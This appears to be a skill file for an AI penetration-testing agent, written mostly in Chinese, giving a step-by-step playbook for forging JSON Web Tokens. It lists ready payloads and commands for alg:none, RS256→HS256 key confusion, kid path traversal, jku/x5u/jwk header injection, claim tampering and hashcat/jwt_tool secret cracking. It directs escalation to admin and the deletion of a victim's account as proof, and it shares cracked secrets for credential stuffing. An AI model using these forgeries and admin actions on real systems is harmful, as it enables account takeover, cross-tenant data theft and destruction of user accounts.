---
name: jwt-forgery
description: "目标用 JWT 认证(登录/token 响应、Authorization: Bearer eyJ...、cookie 中出现 eyJ...)时使用。本技能管 JWT 签名与密码学伪造(alg:none、RS256→HS256 密钥混淆、kid/jku/x5u/jwk 头注入、弱 HMAC 密钥破解、声明篡改); 登录面弱口令爆破归 web-login-brute, 完整账号接管(ATO)链编排归危害补强。"
---

# JWT 伪造 —— 可伪造任意身份的 JSON Web Token(A04 密码学失效)

JWT 结构为 `header.payload.signature`, 三段各自 base64url。签名是唯一阻止你
篡改 payload(你的身份/角色)后重放的东西。当验证端可被诱骗接受你伪造的
token——即无需对方任何密钥就能变成其他用户或管理员——属 high/critical 级
危害, 可直接上报。

两个最经典、通用的验证端缺陷:

- **`alg:none`** —— 验证端信任 token 自身的 `alg` 头。把 `alg` 设为
  `"none"`、去掉签名、改 payload(如 `role:"admin"`、其他用户的
  `id`/`email`)。有缺陷的验证端会跳过签名校验。
- **RS256 → HS256 密钥混淆** —— token 用 RS256(非对称)签名。RSA **公**钥
  本来就是公开的。若验证端允许你选 HS256, 它会拿那把公钥当 HMAC *密钥*——
  而这把你也有。用公钥以 HS256 重签一个改过的 payload 即可通过校验。

## 攻击面信号

```
Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
Authorization: Bearer eyJ...    on authenticated requests
A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle
```

解码 header(第一段做 base64url 解码)。`"alg":"RS256"` → 试密钥混淆;
任意 alg → 永远先试 `alg:none`, 零成本。

## 方法步骤

### 0. 伪造工具(禁止手搓 base64, 用专用 JWT 工具)

用专用工具保证编码/签名正确: **jwt_tool**(`jwt_tool <token> -T` 交互式
篡改, `-X a` 打 alg:none, `-X k -pk public.pem` 打密钥混淆)、Burp 的
**JWT Editor** 扩展, 或几行 **PyJWT**。平台路径
`/opt/tools/jwt_tool/jwt_tool.py`(jwt_tool 首跑会在 cwd 静默生成
jwtconf.ini 像卡死——先 cd 到工具目录跑一次完成配置, 详见
web-login-brute §8)。下面每种伪造给出思路 + 要改的声明。

### 1. alg:none —— 变成 admin/其他用户

```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```

部分验证端拒绝小写 `none` 但接受 `None`/`NONE`/`nOnE`——把大小写变体都试一遍。

### 2. RS256 → HS256 密钥混淆 —— 拿到 RSA 公钥之后

```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

### 3. kid 头注入 —— 验证端从 `kid` 指定的 FILE 加载 HMAC 密钥

```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```

先穿出密钥目录(`../` 足够深)。若密钥查找落到 DB/shell/URL, `kid` 还能携带
SQLi/命令注入/SSRF——思路相同: `kid` 攻击者可控且直通危险 sink。

### 4. jku / x5u 头注入(RS256)—— 验证端从 token 里的 URL 拉取公钥

```
1. Host a JWKS containing a public key you control, on a server the verifier can reach.
2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
   with YOUR matching private key.
3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable
   path on the target's OWN domain so the fetch resolves to your JWKS.
```

### 5. jwk 头自签名密钥注入(RS256)—— 把攻击者控制的公钥嵌进 token

```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```

部分验证端错误地信任 header 里的 `jwk`(JSON Web Key)声明并用它校验签名。
自己生成 RSA 密钥对, 把公钥嵌进 token header, 用配对私钥签名后发送。当验证端
不校验密钥来源、无允许列表时即成立。

### 6. 过期/时间类声明篡改

```
Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
```

与上述任意伪造技术(alg:none、密钥混淆、jwk 注入)组合, 在验证端不强制严格
过期规则时可绕过时间校验。

### 7. 跨租户声明注入 —— 换声明值越权到其他租户数据

```
Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
"workspace_id", "customer_id". Edit the target claim to another tenant's value.
Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
```

这是**基于声明的系统性 IDOR**——若授权逻辑只信 token 声明、不在服务端校验
归属, 你就能跨进其他租户的资源。与 alg:none 或弱密钥攻击组合效果尤其好。

**payload 形状铁律**: 先解码一个真实 token, 让伪造 payload 与其形状一致——
保留原有声明名, 只改身份/角色。应用解析不了的 payload 会因错误原因失败,
白白浪费尝试。

### 8. 离线攻击 —— 弱 HMAC 密钥破解

token 为 HS256(HMAC)且密钥弱、或来自已知密码表时:
```bash
# Hashcat: mode 16500 = JWT
hashcat -a 0 -m 16500 <jwt_file> rockyou.txt

# jwt_tool: built-in wordlist cracking
jwt_tool <token> -C -d wordlist.txt
```

密钥破出后, 即可用该密钥以 HS256 伪造任意 token(jwt_tool 或 PyJWT)。

### 9. 自动化攻击套件

用专用 JWT 攻击套件并行跑全部已知伪造模式:
```bash
# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
jwt_tool <token> -X a

# Nuclei: automated JWT vuln scanning
nuclei -u <target_url> -t jwt/ -timeout 10s
```

在 JWT 侦察早期就跑, 通常比手工逐条串链更快命中。

### 10. 冲击高价值目标(admin)—— 伪造成功不要停

伪造 token 能打开你自己 的 `/my-account` 不算目标达成——那只证明伪造机制
可用。目标几乎总是 **admin**: 到达管理员专属页面并执行一个管理动作(如删除
用户)。任一伪造被接受后**立即升级**——身份改成 admin 且直奔管理端点。禁止
反复重造 `/my-account` 或反复重新登录, 那是漂移。

固定升级序列(按序执行, 禁止在前几步上打转):

1. 伪造 admin 身份并打管理页(声明名对照真实 token 解码结果试: `sub`、
   `role`、`isAdmin`、`username`), 例如一个 `kid` 指向 `/dev/null`、空密钥
   的 HS256 token, payload `{"sub":"administrator"}`, 发 `GET /admin`。
2. `/admin` 返回 200(看到管理控件/删除链接)后, 用**同一个**伪造 token
   执行管理动作——典型如删除目标用户账号, 例如
   `GET /admin/delete?username=<victimuser>`(部分应用用 `POST /admin/delete`
   ——读管理页面确认确切表单/动词)。

`/admin` 返回 401 说明伪造/声明不对——一次只改一处(kid 的穿越深度、声明名
或值、或 alg)再打 `/admin`。禁止退回裸的未认证 `GET /admin`(不带 token)
——那必然 401, 纯浪费。

### 11. 影响证明与验证纪律

- 把伪造 token 指向受保护/管理端点, 证明读到了不该读的数据: 账号/用户列表
  (多个用户的邮箱)、其他用户的对象, 或完成的管理动作(删号确认回执)。
  用伪造 token 读到管理用户列表或执行管理动作**本身就是利用成立**。
- 解码确认你发出的 token 确实携带了篡改后的声明。
- 赢点是**跨身份数据访问**, 不是一个裸 200。在响应里展示他人数据(如其他
  用户邮箱)。
- 200 只返回你自己的数据、或 401, 都不是证据。
- `alg:none` 被拒(401)只说明该缺陷已修——先试完密钥混淆再下"应用安全"
  的结论。

## 证据要求

- **伪造链**: 原始 token 与伪造 token 全文(header/payload 解码对照, 标出
  被篡改的声明)+ 所用 jwt_tool/hashcat 命令回执
- **请求/响应**: 携带伪造 token 的完整请求(含 Authorization 头)+ 响应
  片段——跨身份数据(他人邮箱/用户列表/他人对象)或管理动作完成回执
  (如删号确认); 200 仅返回自身数据或 401 不构成证据
- **弱密钥**: 破解命令回执 + 破出的 secret + 用该 secret 签发 token 被服务端
  接受的响应
- **kid/jku/x5u 类**: 注入的头值原文 + 验证端向你控制的 JWKS/本地文件发起
  请求的确认(OOB 回连日志或服务端行为差异)

## 停止条件

- 伪造 token 完成一次跨身份数据读取或管理动作 → 固化证据立即停, 不做进一步
  破坏性操作(删号验证一次即止), 转落账
- `alg:none` 被拒不算停止信号——密钥混淆/kid/jku/jwk/弱密钥全部试完且均 401、
  又无 JWKS/公钥可得, 才可声明该面无 JWT 密码学缺陷
- 禁止循环重打 `/my-account` 自证; 禁止裸 token 探测 `/admin`(必 401)
- 重试时一次只改一个变量(kid 穿越深度/声明名或值/alg)

## 落账

**severity 判定(report_vulnerability)**:

- **critical**: 伪造 token 可访问他人数据或管理端点并完成管理动作(任意身份
  冒充); 弱 secret 破解且可签发任意身份 token 同为 critical 候选
- **high**: 伪造机制可用但越权范围受限(如仅跨租户只读、仅自身角色声明被
  接受但无敏感面)
- **medium**: 时间类声明篡改/exp 缺失被接受, 但无实际越权数据
- 被拒绝的伪造模式不报

**publish_intel**:

- 破解出的 HMAC secret(标注来源端点, 供 weakcred 复用面与撞库消费)
- JWKS/公钥端点、token 签发与校验端点(入口面/资产条目)
- 可用的伪造模式 + 该应用 token 的声明结构(供同栈其他面直接复用)
